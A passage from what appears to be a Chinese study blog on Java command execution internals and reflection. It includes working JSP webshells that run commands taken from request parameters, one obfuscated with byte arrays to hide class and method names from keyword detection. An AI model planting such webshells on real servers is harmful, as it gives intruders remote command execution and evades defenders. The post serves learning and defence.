((a = in.read(b)) != -<span class="hljs-number">1</span>) &#123;<br>        baos.write(b, <span class="hljs-number">0</span>, a);<br>    &#125;<br>    out.write(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span> + <span class="hljs-keyword">new</span> String(baos.toByteArray()) + <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>%&gt;<br></code></pre></td></tr></table></figure><h3 id="Runtime-命令执行调用链"><a href="#Runtime-命令执行调用链" class="headerlink" title="Runtime 命令执行调用链"></a>Runtime 命令执行调用链</h3><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220612221321403.png"></p><p><code>exec</code>并不是命令执行的最终点，<a href="https://mp.weixin.qq.com/s/rb3aq-Si0Q35gm_0yLQxCA">参考</a></p><p>首先进入<code>exec</code>方法发现，调用两次重载方法<code>exec</code>，第二次调用重载方法发现是分割命令参数，即划分为<code>String[] cmdarray</code>，<code>ProcessBuilder.start()</code>调用<code>ProcessImpl.start()</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220612222530565.png"></p><p>在<code>ProcessBuilder.start()</code>经过安全检查(如果配置有安全策略，可见这里可能产生阻断)，那么从调用链的顺序来说，直接调用<code>ProcessImpl.start()</code>是否可以绕过安全策略</p><p>在<code>ProcessImpl.start()</code>内，创建<code>ProcessImpl</code>对象</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220612223609973.png"></p><p>这里检查<code>jdk.lang.Process.allowAmbiguousCommands</code>，这个值尚不清楚作用，上下文来看，应该是对命令做检查即<code>cmdstr</code>的生成</p><p>跟进到<code>create</code>方法，不能步进；发现是一个 native 方法(是一个其他语言写的函数作为动态库引入，java 在运行时即加载，这里声明了就可以直接调用)，并且这里就执行了我们的命令</p><blockquote><p>Create a process using the win32 function CreateProcess. The method is synchronized due to MS kb315939 problem. All native handles should restore the inherit flag at the end of call.</p><p>kb315939：A 启动 B，B 启动 C。C 循环打印到 System.err。B 关闭流向 C 并退出。A 期望从流到 B 的 EOF，但它没有发生。</p></blockquote><h3 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        BufferedReader br = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span>&#123;<br>            Process p = <span class="hljs-keyword">new</span> ProcessBuilder(<span class="hljs-string">&quot;whoami&quot;</span>).start();<br>            br = <span class="hljs-keyword">new</span> BufferedReader(<span class="hljs-keyword">new</span> InputStreamReader(p.getInputStream()));<br>            String line = <span class="hljs-keyword">null</span>;<br>            StringBuilder sb = <span class="hljs-keyword">new</span> StringBuilder();<br>            <span class="hljs-keyword">while</span>((line= br.readLine())!=<span class="hljs-keyword">null</span>)&#123;<br>                sb.append(line+<span class="hljs-string">&quot;\n&quot;</span>);<br>            &#125;<br>            System.out.println(sb.toString());<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">if</span>(br != <span class="hljs-keyword">null</span>)&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    br.close();<br>                &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%<br>    InputStream in = <span class="hljs-keyword">new</span> ProcessBuilder(request.getParameterValues(<span class="hljs-string">&quot;cmd&quot;</span>)).start().getInputStream();<br>    ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>    <span class="hljs-keyword">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>    <span class="hljs-keyword">int</span> a = -<span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">while</span> ((a = in.read(b)) != -<span class="hljs-number">1</span>) &#123;<br>        baos.write(b, <span class="hljs-number">0</span>, a);<br>    &#125;<br>    out.write(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span> + <span class="hljs-keyword">new</span> String(baos.toByteArray()) + <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>%&gt;<br></code></pre></td></tr></table></figure><p>这里需要注意的是，调式时调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ProcessBuilder(cmdarray)<br>            .environment(envp)<br>            .directory(dir)<br>            .start();<br></code></pre></td></tr></table></figure><p>其中<code>environment</code>方法属于 default 域不可调用，因此可以试试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> ProcessBuilder(<span class="hljs-string">&quot;calc&quot;</span>).start();<br><span class="hljs-keyword">new</span> ProcessBuilder(<span class="hljs-string">&quot;calc&quot;</span>).directory(<span class="hljs-keyword">null</span>).start();<br></code></pre></td></tr></table></figure><p><code>ProcessImpl</code>不能直接命令执行，需要反射</p><p><strong>（JDK9 以后 ProcessImpl 与 UNIXProcess 合并了）</strong></p><h2 id="Java-反射"><a href="#Java-反射" class="headerlink" title="Java 反射"></a>Java 反射</h2><p>Java 反射(<code>Reflection</code>)是 Java 非常重要的动态特性，通过使用反射我们不仅可以获取到任何类的成员方法(<code>Methods</code>)、成员变量(<code>Fields</code>)、构造方法(<code>Constructors</code>)等信息，还可以动态创建 Java 类实例、调用任意的类方法、修改任意的类成员变量值等。Java 反射机制是 Java 语言的动态性的重要体现，也是 Java 的各种框架底层实现的灵魂。</p><h3 id="获取-Class-对象"><a href="#获取-Class-对象" class="headerlink" title="获取 Class 对象"></a>获取 Class 对象</h3><p>上一节讲到类的动态加载有两种方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//反射加载Moonlight实例</span><br>Class.forName(<span class="hljs-string">&quot;xxx-package.Moonlight&quot;</span>);<br><br><span class="hljs-comment">//ClassLoader加载Moonlight实例</span><br><span class="hljs-keyword">this</span>.getClass().getClassLoader().loadClass(<span class="hljs-string">&quot;xxx-package.Moonlight&quot;</span>);<br></code></pre></td></tr></table></figure><p>以及直接<code>类名.class</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Class rt = Runtime.class;<br></code></pre></td></tr></table></figure><p>这都是获取到 Class 对象的方式</p><p>获取数组类型的 Class 对象需要特殊注意,需要使用 Java 类型的描述符方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt; doubleArray = Class.forName(<span class="hljs-string">&quot;[D&quot;</span>);<span class="hljs-comment">//相当于double[].class</span><br>Class&lt;?&gt; cStringArray = Class.forName(<span class="hljs-string">&quot;[[Ljava.lang.String;&quot;</span>);<span class="hljs-comment">// 相当于String[][].class</span><br></code></pre></td></tr></table></figure><p>获取 Runtime 类 Class 对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">Strintg className = <span class="hljs-string">&quot;java.lang.Runtime&quot;</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">runtimeclass1</span> </span>= class.forName(className);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">runtimeclass2</span> </span>= java.lang.Runtime.class;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">runtimeclass3</span> </span>= ClassLoader.getSystemclassLoader().loadclass(className);<br></code></pre></td></tr></table></figure><p>调用内部类的需要将内部类以<code>$</code>限定如</p><p><code>org.abc.Demo$hello</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.abc<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span></span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>&#123;&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">hello</span></span>&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="反射命令执行"><a href="#反射命令执行" class="headerlink" title="反射命令执行"></a>反射命令执行</h3><h4 id="Runtime-1"><a href="#Runtime-1" class="headerlink" title="Runtime"></a>Runtime</h4><p>首先了解这个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Runtime</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Runtime currentRuntime = <span class="hljs-keyword">new</span> Runtime();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Returns the runtime object associated with the current Java application.</span><br><span class="hljs-comment">     * Most of the methods of class &lt;code&gt;Runtime&lt;/code&gt; are instance</span><br><span class="hljs-comment">     * methods and must be invoked with respect to the current runtime object.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span>  the &lt;code&gt;Runtime&lt;/code&gt; object associated with the current</span><br><span class="hljs-comment">     *          Java application.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Runtime <span class="hljs-title">getRuntime</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> currentRuntime;<br>    &#125;<br><br>    <span class="hljs-comment">/** Don&#x27;t let anyone else instantiate this class */</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">Runtime</span><span class="hljs-params">()</span> </span>&#123;&#125;<br><br>    ...<br></code></pre></td></tr></table></figure><p>首先是<code>Runtime.Runtime</code>居然是私有的，原因注释也说了：它本身不希望除自身以外去实例这个类，作为一个私有构造方法，我们没有办法<code>new Runtime()</code>创建<code>Runtime</code>对象</p><p>在安全漫谈里面谈到这个“单例模式”，其中的例子是数据库连接，建立数据库连接是比较耗费资源的，把建立数据库连接放在构造方法中，查询语句就在一些普通方法内，每一次查询都是在一个实例对象中调用一次普通方法，而不用 new 一个连接类查询一次，避免建立多个连接，减少开销</p><p>因此我们有两个方向可以创建这个类的实例，<strong>一是通过<code>getMethod</code>获得<code>getRuntime</code>方法来获得实例对象，二是通过修改构造方法权限获取实例</strong></p><h5 id="修改构造方法权限获得实例"><a href="#修改构造方法权限获得实例" class="headerlink" title="修改构造方法权限获得实例"></a>修改构造方法权限获得实例</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//获得Runtime类</span><br>            Class runtimeclass = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>            <span class="hljs-comment">//获得构造方法</span><br>            Constructor constructor = runtimeclass.getDeclaredConstructor();<br>            <span class="hljs-comment">//Runtime构造方法是private，修改其访问权限</span><br>            constructor.setAccessible(<span class="hljs-keyword">true</span>);<br>            <span class="hljs-comment">//获得Runtime实例</span><br>            Object runtimeInstance = constructor.newInstance();<br>            <span class="hljs-comment">//获得Runtime实例的exec(String)方法</span><br>            Method runtimemethod = runtimeclass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>            <span class="hljs-comment">//调用exec(String)方法</span><br>            Process p = (Process) runtimemethod.invoke(runtimeInstance, <span class="hljs-string">&quot;whoami&quot;</span>);<br><br>            InputStream is = p.getInputStream();<br>            InputStreamReader isr =  <span class="hljs-keyword">new</span> InputStreamReader(is);<br>            BufferedReader br = <span class="hljs-keyword">new</span> BufferedReader(isr);<br>            StringBuilder sb=<span class="hljs-keyword">new</span> StringBuilder();<br>            String line = <span class="hljs-keyword">null</span>;<br>            <span class="hljs-keyword">while</span> ((line = br.readLine()) != <span class="hljs-keyword">null</span>) &#123;<br>                sb.append(line);<br>                System.out.println(line);<br>            &#125;<br>            br.close();<br>            isr.close();<br>            is.close();<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException | NoSuchMethodException | InstantiationException | IllegalAccessException |<br>                 InvocationTargetException | IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>代码中不希望出现<code>Runtime</code>之类的关键字，可以全部反射代替</p><p>写成 jsp，传参 str=</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Method&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Scanner&quot;</span> %&gt;<br><br>&lt;%<br>    String str = request.getParameter(<span class="hljs-string">&quot;str&quot;</span>);<br><br>    <span class="hljs-comment">// 定义&quot;java.lang.Runtime&quot;字符串变量</span><br>    String rt = <span class="hljs-keyword">new</span> String(<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[]&#123;<span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">46</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">46</span>, <span class="hljs-number">82</span>, <span class="hljs-number">117</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>&#125;);<br><br>    <span class="hljs-comment">// 反射java.lang.Runtime类获取Class对象</span><br>    Class&lt;?&gt; c = Class.forName(rt);<br><br>    <span class="hljs-comment">// 反射获取Runtime类的getRuntime方法</span><br>    Method m1 = c.getMethod(<span class="hljs-keyword">new</span> String(<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[]&#123;<span class="hljs-number">103</span>, <span class="hljs-number">101</span>, <span class="hljs-number">116</span>, <span class="hljs-number">82</span>, <span class="hljs-number">117</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>&#125;));<br><br>    <span class="hljs-comment">// 反射获取Runtime类的exec方法</span><br>    Method m2 = c.getMethod(<span class="hljs-keyword">new</span> String(<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[]&#123;<span class="hljs-number">101</span>, <span class="hljs-number">120</span>, <span class="hljs-number">101</span>, <span class="hljs-number">99</span>&#125;), String.class);<br><br>    <span class="hljs-comment">// 反射调用Runtime.getRuntime().exec(xxx)方法</span><br>    Object obj2 = m2.invoke(m1.invoke(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[]&#123;&#125;), <span class="hljs-keyword">new</span> Object[]&#123;str&#125;);<br><br>    <span class="hljs-comment">// 反射获取Process类的getInputStream方法</span><br>    Method m = obj2.getClass().getMethod(<span class="hljs-keyword">new</span> String(<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[]&#123;<span class="hljs-number">103</span>, <span class="hljs-number">101</span>, <span class="hljs-number">116</span>, <span class="hljs-number">73</span>, <span class="hljs-number">110</span>, <span class="hljs-number">112</span>, <span class="hljs-number">117</span>, <span class="hljs-number">116</span>, <span class="hljs-number">83</span>, <span class="hljs-number">116</span>, <span class="hljs-number">114</span>, <span class="hljs-number">101</span>, <span class="hljs-number">97</span>, <span class="hljs-number">109</span>&#125;));<br>    m.setAccessible(<span class="hljs-keyword">true</span>);<br><br>    <span class="hljs-comment">// 获取命令执行结果的输入流对象：p.getInputStream()并使用Scanner按行切割成字符串</span><br>    Scanner s = <span class="hljs-keyword">new</span> Scanner((InputStream) m.invoke(obj2, <span class="hljs-keyword">new</span> Object[]&#123;&#125;)).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>    String result = s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-comment">// 输出命令执行结果</span><br>    out.println(result);<br>%&gt;<br></code></pre></td></tr></table></figure><p>其中获取构造方法时，<code>class.getDeclaredConstructor</code>和<code>Class.getConstructor</code>都可以获得类构造方法，但是**<code>Class.getConstructor</code>无法获取私有方法**</p><p>如果构造方法有一个或多个参数的情况下我们应该在获取构造方法时候传入对应的参数类型数组，如：<code>clazz.getDeclaredConstructor(String.class, String.class)</code></p><p>获得构造方法，修改权限后，实例化<code>constructor</code>即<code>constructor.newInstance()</code>，有参数时<code>constructor.newInstance(a,b,...)</code></p><p><strong>如果以 类.newInstance 则等价于 new 类()，并且要有无参构造方法</strong></p><p>编写<code>Runtime</code>类的方法<code>runtimeclass.getMethod(&quot;exec&quot;,String.class)</code></p><blockquote><p>获取当前类所有的成员方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Method[] methods = clazz.getDeclaredMethods()<br></code></pre></td></tr></table></figure><p>获取当前类指定的成员方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Method method = clazz.getDeclaredMethod(<span class="hljs-string">&quot;方法名&quot;</span>);<br>Method method = clazz.getDeclaredMethod(<span class="hljs-string">&quot;方法名&quot;</span>, 参数类型如String.class，多个参数用<span class="hljs-string">&quot;,&quot;</span>号隔开);<br></code></pre></td></tr></table></figure><p><code>getMethod</code>和<code>getDeclaredMethod</code>都能够获取到类成员方法，区别在于<code>getMethod</code>只能获取到<code>当前类和父类</code>的所有有权限的方法(如：<code>public</code>)，而<code>getDeclaredMethod</code>能获取到当前类的所有成员方法(不包含父类)</p></blockquote><p>调用<code>exec</code>方法<code>runtimeclass.invoke(runtimeInstance,&quot;calc&quot;)</code></p><p><strong>非 static 方法</strong><code>invoke</code>的第一个参数必须是类实例对象，如果调用的是<code>static</code>方法那么第一个参数值可以传<code>null</code>，因为在 java 中调用静态方法是不需要有类实例的，因为可以直接<code>类名.方法名(参数)</code>的方式调用；第二个参数是传入调用方法的参数</p><p>在<code>getRuntime单例模式获得实例可见此情形</code></p><p>获取当前类所有成员变量：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Field fields = clazz.getDeclaredFields();<br></code></pre></td></tr></table></figure><p>获取当前类指定成员变量：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Field field = clazz.getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>); <span class="hljs-comment">//getField只能获取public与获取构造方法一样</span><br></code></pre></td></tr></table></figure><p>获取成员变量的值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Object obj = field.get(类实例对象)<br></code></pre></td></tr></table></figure><p>修改成员变量的值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">field.set(类实例对象，修改后的值)<br></code></pre></td></tr></table></figure><p>同理，当我们没有修改的成员变量权限时可以使用: <code>field.setAccessible(true)</code>的方式修改为访问成员变量访问权限</p><p>如果我们需要修改被<code>final</code>关键字修饰的成员变量，那么我们需要先修改方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 反射获取Field类的modifiers</span><br>Field modifiers = field.getClass().getDeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>);<br><br><span class="hljs-comment">// 设置modifiers修改权限</span><br>modifiers.setAccessible(<span class="hljs-keyword">true</span>);<br><br><span class="hljs-comment">// 修改成员变量的Field对象的modifiers值</span><br>modifiers.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);<br><br><span class="hljs-comment">// 修改成员变量值</span><br>field.set(类实例对象, 修改后的值);<br></code></pre></td></tr></table></figure><h5 id="getRuntime-单例模式获得实例"><a href="#getRuntime-单例模式获得实例" class="headerlink" title="getRuntime 单例模式获得实例"></a>getRuntime 单例模式获得实例</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class rt = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br><span class="hljs-comment">//            Process p = (Process) rt.getMethod(&quot;exec&quot;, String.class).invoke(rt.getMethod(&quot;getRuntime&quot;).invoke(rt), &quot;whoami&quot;);</span><br>            Process p = (Process) rt.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(rt.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>), <span class="hljs-string">&quot;whoami&quot;</span>);<br>            InputStream is = p.getInputStream();<br>            InputStreamReader isr =  <span class="hljs-keyword">new</span> InputStreamReader(is);<br>            BufferedReader br = <span class="hljs-keyword">new</span> BufferedReader(isr);<br>            StringBuilder sb=<span class="hljs-keyword">new</span> StringBuilder();<br>            String line = <span class="hljs-keyword">null</span>;<br>            <span class="hljs-keyword">while</span> ((line = br.readLine()) != <span class="hljs-keyword">null</span>) &#123;<br>                sb.append(line);<br>                System.out.println(line);<br>            &#125;<br>            br.close();<br>            isr.close();<br>            is.close();<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException | NoSuchMethodException | IllegalAccessException | InvocationTargetException |<br>                 IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>利用<code>Runtime</code>类的单例模式，<code>Runtime.getRuntime</code>获取到<code>Runtime</code>对象</p><p>分解一下就是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs 